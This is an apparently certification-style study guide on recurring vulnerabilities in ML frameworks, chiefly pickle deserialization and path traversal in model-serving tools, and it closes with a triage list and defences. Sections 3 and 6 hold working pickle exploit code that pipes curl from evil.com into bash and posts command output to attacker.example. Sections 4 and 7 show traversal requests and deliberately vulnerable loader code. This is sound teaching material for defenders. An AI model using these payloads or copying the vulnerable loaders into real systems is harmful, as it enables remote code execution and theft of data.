# Vulnerable Framework Code

> HTB Certified Offensive AI Expert -- Study Guide
> Module: Attacking AI - Application and System | Section: Vulnerable Framework Code

---

## Table of Contents

1. [What Is "Vulnerable Framework Code"?](#1-what-is-vulnerable-framework-code)
2. [Why ML Frameworks Are a Growing Target](#2-why-ml-frameworks-are-a-growing-target)
3. [Vulnerability Class 1: Insecure Deserialization](#3-vulnerability-class-1-insecure-deserialization)
4. [Vulnerability Class 2: Path Traversal in Model-Serving Tools](#4-vulnerability-class-2-path-traversal-in-model-serving-tools)
5. [Vulnerability Class 3: Other Recurring Patterns](#5-vulnerability-class-3-other-recurring-patterns)
6. [Worked Example -- A Pickle Deserialization Walkthrough](#6-worked-example----a-pickle-deserialization-walkthrough)
7. [A Second Example -- Path Traversal Chained into Code Execution](#7-a-second-example----path-traversal-chained-into-code-execution)
8. [Finding These Bugs: A Practical Triage Guide](#8-finding-these-bugs-a-practical-triage-guide)
9. [Security Angle](#9-security-angle)
10. [Defensive Countermeasures](#10-defensive-countermeasures)
11. [Key Takeaways](#11-key-takeaways)

---

## 1. What Is "Vulnerable Framework Code"?

This section is a companion to "Insecure Integrated Components" -- but where that section covered the *supply-chain decision* to include third-party code, this section digs into the *specific recurring bug patterns* found in the ML frameworks and model-serving tools themselves. The goal here is to learn the *shape* of these vulnerability classes well enough to recognize them anywhere, in any framework, rather than memorizing one specific unpatched CVE (which would be outdated the moment a patch ships).

### The Analogy

Think of a lock manufacturer that, across many different lock models over the years, keeps making the same fundamental design mistake: the pins are cut at an angle that lets a specific type of pick bypass them entirely. Locksmiths (and burglars) don't need to study each individual lock model -- once they recognize "ah, this is that same flawed pin-cutting pattern," they know how to defeat almost any lock from that manufacturer, present and future. Learning the *pattern* is far more valuable than learning any single lock's specific flaw.

ML frameworks have their own recurring "flawed pin-cutting patterns" -- **insecure deserialization** and **path traversal** being the two most consequential and most repeated across the ecosystem. This section teaches you those patterns.

### Formal Definition

**Vulnerable framework code** refers to recurring, well-documented classes of security bugs found across popular ML libraries and model-serving stacks -- most notably insecure deserialization and path traversal -- that arise from design choices common throughout the ML tooling ecosystem, rather than from a single vendor's one-off mistake.

---

## 2. Why ML Frameworks Are a Growing Target

```
                WHY THE ML FRAMEWORK ECOSYSTEM IS AN ATTRACTIVE TARGET

  +-------------------+    +-------------------+    +-------------------+
  |  RAPID GROWTH,     |    |  RESEARCH-ORIGIN    |    |  HIGH-VALUE        |
  |  YOUNG ECOSYSTEM    |    |  CODE, LATE          |    |  TARGETS RUNNING   |
  |                     |    |  SECURITY FOCUS      |    |  THE SOFTWARE      |
  |                     |    |                     |    |                     |
  | New serving tools,  |    | Many core libraries  |    | Companies running  |
  | frameworks, and       |    | started as academic  |    | ML infra often have|
  | file formats appear   |    | projects, prioritizing|    | valuable data       |
  | constantly -- less     |    | features/speed over  |    | (models, training  |
  | time for the security  |    | security review        |    | data, credentials) |
  | community to harden    |    |                       |    | and elevated        |
  | them                   |    |                       |    | infrastructure      |
  |                        |    |                       |    | access (GPUs, cloud|
  |                        |    |                       |    | permissions)        |
  +-------------------+    +-------------------+    +-------------------+
```

This combination -- new, fast-moving, research-descended tooling, deployed by organizations with valuable data and elevated infrastructure access -- is exactly the profile that historically produces a steady stream of serious vulnerabilities, and the ML serving/tooling ecosystem has followed that pattern closely as it has matured from research tool to production-critical infrastructure.

---

## 3. Vulnerability Class 1: Insecure Deserialization

**Serialization** is the process of converting an in-memory object (a Python class instance, a trained model, a data structure) into a stream of bytes that can be saved to disk or sent over a network. **Deserialization** is the reverse: turning those bytes back into a live object. **Insecure deserialization** happens when a program deserializes data from an untrusted source *without restriction on what kind of object can be reconstructed* -- and some serialization formats allow the deserialization process itself to execute arbitrary code as a side effect of "reconstructing" a malicious object.

### The Analogy

Imagine mail-ordering a build-it-yourself furniture kit. A safe kit ships flat-packed wood pieces and instructions -- when you "reconstruct" it, you get a bookshelf, nothing more. An unsafe kit, however, ships with instructions that say "as step 4, also call this phone number and read them your bank account details out loud." Most people would never agree to that if asked directly -- but if the "instructions" are followed automatically and blindly, without anyone reading them first, the malicious step gets executed as part of normal assembly. **Pickle-based deserialization in Python is exactly this unsafe kit**: the file does not just contain data, it contains *instructions* for reconstructing an object, and those instructions can include arbitrary code execution steps if the file's author chose to include them.

### Why This Matters Specifically for ML

Python's built-in `pickle` module is the default serialization mechanism for many popular ML tools, most notably PyTorch's classic `torch.save()`/`torch.load()` format (`.pt`/`.pth` files) and `scikit-learn`'s common practice of pickling trained models directly. **Loading a pickle file is functionally equivalent to running arbitrary code from that file.**

```
                    HOW PICKLE DESERIALIZATION BECOMES CODE EXECUTION

  Malicious .pt / .pkl file contains a serialized object whose
  reconstruction process (the __reduce__ method) is defined to
  call an arbitrary function with arbitrary arguments:

  +------------------------------------------------------------+
  |  class Exploit:                                             |
  |      def __reduce__(self):                                   |
  |          return (os.system, ("curl evil.com/x | bash",))      |
  +------------------------------------------------------------+
                            |
                            v
  Victim code:  torch.load("innocuous_looking_model.pt")
                            |
                            v
  Pickle deserializer faithfully executes: os.system("curl evil.com/x | bash")
  ... simply because "reconstructing this object" was DEFINED to mean
  "run this system command" -- pickle has no concept of "safe reconstruction,"
  it just does whatever __reduce__ says to do.
```

### The Ecosystem-Wide Pattern

| Where This Shows Up | Why |
|------------------------|-----|
| **PyTorch `.pt`/`.pth` files (legacy format)** | `torch.load()` uses pickle under the hood by default in older/legacy code paths |
| **scikit-learn model files (`joblib`/`pickle`)** | The standard "how do I save my model" tutorial for years has been "just pickle it" |
| **NumPy `.npy`/`.npz` with `allow_pickle=True`** | Object arrays are serialized via pickle when this flag is enabled |
| **Many custom internal ML tools** | Engineers copy the "just pickle it" pattern for checkpoints, feature stores, and cached intermediate results, without realizing the security implication |
| **YAML-based configuration loaders using unsafe load functions** | Certain YAML parsing modes allow instantiation of arbitrary Python objects from config files, similar in spirit to pickle risk |

**This directly connects back to "Artifact Inspection" (Model Reverse Engineering) and "Model Registry Poisoning" (Model Deployment Tampering)** earlier in this module: any point in the pipeline where an untrusted model *file* gets loaded is a potential insecure deserialization trigger, regardless of whether the untrusted file arrived via a poisoned registry, a malicious download, or a helpful-seeming shared checkpoint from an online model hub.

---

## 4. Vulnerability Class 2: Path Traversal in Model-Serving Tools

**Path traversal** (also called directory traversal) is a classic web vulnerability where an application accepts a filename or path from user input and uses it to read or write a file, without properly restricting that path to an intended directory -- letting an attacker use sequences like `../../` to "climb out" of the intended folder and access arbitrary files elsewhere on the filesystem.

### The Analogy

Imagine a hotel valet system where guests hand over a ticket with a room number written on it, and the valet fetches whatever car is parked in that numbered spot. If the system blindly trusts whatever is written on the ticket -- including a guest writing "employee reserved spot #1" instead of a real guest number -- the valet, following the literal instruction with no validation, hands over a car that was never meant to be accessible to that guest. Path traversal works the same way: the serving tool is handed a "spot number" (a file path) and blindly fetches whatever is there, including places it should never have granted access to.

### Why Model-Serving Tools Are Prone to This

Model-serving frameworks frequently need to accept a **model name/identifier from a request** and translate it into a file path on disk to load the correct model (especially in multi-model serving setups, where one server hosts many different models, selected by a URL parameter or request field).

```
                    PATH TRAVERSAL IN A MULTI-MODEL SERVER

  Intended behavior:
  GET /models/fraud-detector-v3/predict
         |
         v
  Server maps "fraud-detector-v3" --> /var/models/fraud-detector-v3/model.bin
         |
         v
  Loads and serves that specific model.  Works as intended.

  Attack:
  GET /models/../../../../etc/passwd/predict
         |
         v
  If the server naively concatenates the path without validation:
  /var/models/ + "../../../../etc/passwd" --> /etc/passwd
         |
         v
  Server attempts to read/serve a completely unintended file --
  potentially leaking secrets, configuration, or other models'
  files the requester should never have had access to.
```

### Realistic Consequences Beyond "Reading /etc/passwd"

| Consequence | Example |
|-------------|---------|
| **Reading other tenants' models in a multi-tenant serving platform** | A model-hosting SaaS platform where "model name" in the request maps to a path -- path traversal could let one customer access another customer's proprietary model file |
| **Reading configuration/credential files** | Serving containers often have environment configs, API keys, or cloud credentials on disk nearby -- path traversal can exfiltrate these directly |
| **Writing/overwriting files** (in serving tools that also support model upload/update via a similar path parameter) | An attacker could overwrite a legitimate model file with their own, achieving an effect very similar to Model Deployment Tampering, but via an application-layer bug rather than a registry-access compromise |
| **Triggering deserialization on an arbitrary file** | If the traversal lets an attacker point the loader at a file *they* control (e.g., uploaded via an unrelated feature), path traversal can be chained directly into insecure deserialization for code execution |

---

## 5. Vulnerability Class 3: Other Recurring Patterns

Deserialization and path traversal are the two highest-yield patterns to know cold for the exam, but a few other recurring patterns round out the picture and are worth recognizing.

| Pattern | Description | Typical ML Context |
|---------|--------------|----------------------|
| **Server-Side Request Forgery (SSRF)** | An application fetches a URL supplied (directly or indirectly) by the user, letting an attacker make the server issue requests to internal-only services | Model download-by-URL features ("load a model from this link"), plugin/tool integrations that fetch external resources on the model's behalf |
| **Remote Code Execution via unsafe config loading** | Configuration file formats or plugin systems that allow specifying arbitrary code/import paths to load at startup | ML frameworks with "custom layer" or "custom loss function" loading mechanisms that import and execute code specified in a config file |
| **Unsafe reflection/dynamic import** | Loading a Python class or function by name from a string supplied in a request or config, without an allow-list | Plugin architectures, "model type" selection fields that map directly to a dynamic `import` statement |
| **Missing authentication on internal serving/management APIs** | Model-serving frameworks that expose management endpoints (reload model, view metrics, change config) with no authentication by default, assuming "internal network only" is sufficient | Common in default configurations of several popular open-source serving stacks, especially when accidentally exposed to the public internet |
| **Resource exhaustion via oversized/malformed model files at load time** | Loading a model file itself (not just an inference request) can be exploited the same way as the "oversized inputs" pattern from Denial of ML Service | Decompression bombs or deeply nested structures embedded inside a model archive format |

---

## 6. Worked Example -- A Pickle Deserialization Walkthrough

A small startup runs an internal "model zoo" web app: employees can upload a `.pt` (PyTorch) checkpoint file and the app automatically loads it to display a summary (layer count, parameter count) for cataloging purposes.

### Step 1: The Vulnerable Code

```python
# model_zoo/upload_handler.py  (illustrative, simplified)

import torch

def handle_upload(uploaded_file):
    checkpoint = torch.load(uploaded_file)   # <-- loads via pickle under the hood
    summary = summarize_model(checkpoint)
    return summary
```

There is no validation of the file's contents before `torch.load()` is called -- the function trusts that any `.pt` file handed to it is a well-behaved model checkpoint.

### Step 2: Crafting the Malicious File

An attacker (an employee with grudge access, or an external party who found the upload endpoint exposed) crafts a Python object whose pickle reconstruction process runs an arbitrary command:

```python
import pickle, os

class Exploit:
    def __reduce__(self):
        return (os.system, ("id > /tmp/pwned && curl -X POST -d @/tmp/pwned http://attacker.example/callback",))

with open("totally_normal_model.pt", "wb") as f:
    pickle.dump(Exploit(), f)
```

The resulting file has the extension `.pt`, looks like a normal checkpoint to a casual glance (it's a binary pickle stream, indistinguishable at a glance from a legitimate model), and passes any naive "does this file have the right extension" check.

### Step 3: Triggering the Exploit

```
Attacker uploads "totally_normal_model.pt" to the model zoo app.
       |
       v
handle_upload() calls torch.load(uploaded_file)
       |
       v
Pickle deserializer reconstructs the Exploit object by calling:
   os.system("id > /tmp/pwned && curl ... http://attacker.example/callback")
       |
       v
Arbitrary command execution on the model zoo server, using
whatever privileges the web application process runs under.
```

### Step 4: Why It Happened

- The application treated "loading a model file" as a purely data-processing operation, when in reality (for this file format) it is equivalent to "running arbitrary code with the application's own permissions."
- No sandboxing, no restricted unpickler, no content validation before the untrusted file reached `torch.load()`.
- The file extension and superficial appearance gave no signal that anything was wrong -- this cannot be caught by "looks like a normal model file" checks; it requires either avoiding pickle-based formats entirely or using a restricted deserializer.

### The Lesson

This is not a bug in PyTorch specifically -- it is an inherent property of Python's pickle format, and the *pattern* (treating "load this file" as safe when the format allows arbitrary code execution) recurs across the ecosystem wherever pickle, or formats with similarly unrestricted deserialization semantics, are used to persist ML artifacts.

---

## 7. A Second Example -- Path Traversal Chained into Code Execution

Individual vulnerability classes are dangerous on their own, but real-world exploitation often comes from **chaining** two patterns together. This example walks through exactly that, connecting Sections 3 and 4.

### Step 1: The Vulnerable Multi-Model Server

```python
# illustrative, simplified multi-model serving endpoint

MODEL_DIR = "/var/models/"

@app.route("/models/<model_name>/predict", methods=["POST"])
def predict(model_name):
    model_path = os.path.join(MODEL_DIR, model_name, "model.pt")
    model = torch.load(model_path)     # <-- pickle-based load, no path validation
    return run_inference(model, request.json)
```

Two separate weaknesses are stacked here: `model_name` is concatenated directly into a filesystem path with no sanitization (path traversal, Section 4), and whatever file ends up at that resolved path gets loaded via a pickle-based `torch.load()` with no restriction on what kind of object may be reconstructed (insecure deserialization, Section 3).

### Step 2: Getting a Malicious File Onto the Server

The attacker needs their crafted malicious pickle payload (built exactly as shown in Section 6's worked example) to exist *somewhere* on the server's filesystem that they can reference via a traversal path. Common ways this becomes possible in practice: an unrelated file-upload feature elsewhere in the application (e.g., a "upload your profile picture" endpoint that saves files to a predictable, discoverable location), a temporary file left behind by another process, or a world-writable shared directory used for some other legitimate purpose.

```
Attacker uploads their malicious pickle payload disguised as an
image via an unrelated "profile picture" upload feature:

  Saved to: /var/app/uploads/user_42/profile.jpg
  (but the BYTES are actually a malicious pickle stream,
   not a real JPEG -- the upload feature never validated content,
   only the file extension)
```

### Step 3: The Chained Exploit

```
POST /models/../../app/uploads/user_42/profile/predict
                     |
                     v
os.path.join("/var/models/", "../../app/uploads/user_42/profile", "model.pt")
                     |
                     v
Resolves to something like: /var/app/uploads/user_42/profile/model.pt
(attacker adjusts the exact traversal depth/filename conventions
 during recon until the resolved path matches their planted file)
                     |
                     v
torch.load() deserializes the attacker's malicious pickle payload
                     |
                     v
Arbitrary code execution on the model-serving host
```

### The Lesson

Neither weakness alone required much sophistication, but the *combination* -- a path traversal bug providing arbitrary file read/load control, paired with a deserialization bug turning "load this file" into "execute this code" -- produced full remote code execution from two individually modest-looking bugs. This chaining pattern is extremely common in real-world ML infrastructure findings and is exactly the kind of connection the exam expects you to be able to draw between vulnerability classes covered in the same section.

---

## 8. Finding These Bugs: A Practical Triage Guide

When auditing an ML serving stack (whether for the exam, a CTF-style challenge, or a real engagement), work through this triage sequence.

| Step | What to Check | Vulnerability Class |
|------|-------------------|--------------------|
| 1 | Does the application load model files using `pickle`, `torch.load()` (legacy mode), `joblib.load()`, or `numpy.load(..., allow_pickle=True)`? | Insecure deserialization |
| 2 | Is any part of a file path built from a request parameter, header, or other user-controllable input? | Path traversal |
| 3 | Are there any file upload features elsewhere in the application, even seemingly unrelated ones, that could plant a file for a later path-traversal read? | Chained deserialization + traversal |
| 4 | Does the application fetch a model or resource from a URL supplied (directly or indirectly) by a user/tool/plugin? | SSRF |
| 5 | Are there config or plugin loading mechanisms that accept a class name, import path, or module string as input? | Unsafe reflection/dynamic import |
| 6 | Are management/administrative endpoints (reload model, view config, change routing) reachable without authentication? | Missing authentication on internal APIs |
| 7 | Does model-file loading enforce any size or structural limits before fully parsing/decompressing the file? | Resource exhaustion at load time |

**A practical exam tip**: when you see `torch.load()`, `pickle.load()`, `joblib.load()`, or `yaml.load()` (without `Loader=yaml.SafeLoader`) anywhere in a code sample, treat it as a strong signal worth investigating further -- these four function calls account for a disproportionate share of real-world ML framework vulnerability findings.

---

## 9. Security Angle

> **Security Angle**: When you assess an ML application, treat **"loading a model file" as an execution boundary, not a data-parsing boundary**, whenever the underlying format is pickle-based (or has similarly unrestricted deserialization semantics). The question to always ask is: "does loading this file just parse data, or can it run code?" -- and for a surprising number of popular ML file formats and tools, the honest answer is "it can run code," even though the API surface (`load()`, `.from_pretrained()`, etc.) looks exactly like a harmless data-loading function. This is one of the highest-value, most repeatable findings in ML application security assessments, precisely because so much tooling and so many tutorials normalize pickling models without ever surfacing the risk.

---

## 10. Defensive Countermeasures

| Countermeasure | What It Stops |
|-----------------|----------------|
| **Prefer non-executable serialization formats** (e.g., `.safetensors` instead of pickle-based `.pt`; ONNX; formats with a fixed, restricted schema) | Insecure deserialization / arbitrary code execution from malicious model files |
| **Use restricted unpicklers / `weights_only=True` loading modes** where the framework supports them | Reduces (though does not always eliminate) the attack surface when pickle-based formats must still be used |
| **Never load model files from untrusted or unauthenticated sources without validation/sandboxing** | Malicious checkpoints uploaded by attackers or downloaded from unverified sources |
| **Strict allow-listing and canonicalization of file paths** derived from user input, rejecting any path containing traversal sequences | Path traversal in multi-model serving tools |
| **Running model-loading/serving processes with least-privilege, sandboxed permissions** (containers, restricted filesystem access, no unnecessary network egress) | Limits blast radius even if a deserialization exploit succeeds |
| **Authenticating and network-isolating internal serving/management APIs** | Missing-authentication-on-internal-endpoints pattern |
| **Dependency and CVE scanning specifically for ML serving frameworks**, kept current | Known vulnerabilities in the specific tools/versions in use |
| **Validating and size-limiting model archive contents before extraction/loading** | Resource exhaustion at model-load time (decompression bombs, deeply nested structures) |

---

## 11. Key Takeaways

- **Vulnerable framework code** in ML systems recurs in well-documented *patterns*, most importantly insecure deserialization and path traversal -- learn the pattern, not just a single CVE.
- **Insecure deserialization** exploits the fact that pickle-based formats (common in PyTorch, scikit-learn, NumPy) do not just store data -- they store *instructions* for reconstructing objects, which can include arbitrary code execution.
- **Path traversal** in model-serving tools exploits weak validation of file paths derived from request parameters, letting attackers read/write files far outside the intended model directory -- with consequences ranging from data leakage to full code execution when chained with deserialization.
- Other recurring patterns include SSRF via model-download-by-URL features, unsafe dynamic import/reflection in plugin systems, and missing authentication on internal management APIs.
- **"Loading a model file" is often an execution boundary, not just a data-parsing boundary** -- this single insight is one of the most repeatable, high-value findings across real-world ML application security assessments.
- Defenses center on choosing non-executable serialization formats, strict input/path validation, least-privilege execution environments, and treating any untrusted model file with the same suspicion as an untrusted executable.

---

*Next up: Model Context Protocol (MCP) Attacks -- where we examine security risks specific to the emerging standard for connecting LLMs to external tools and data sources.*
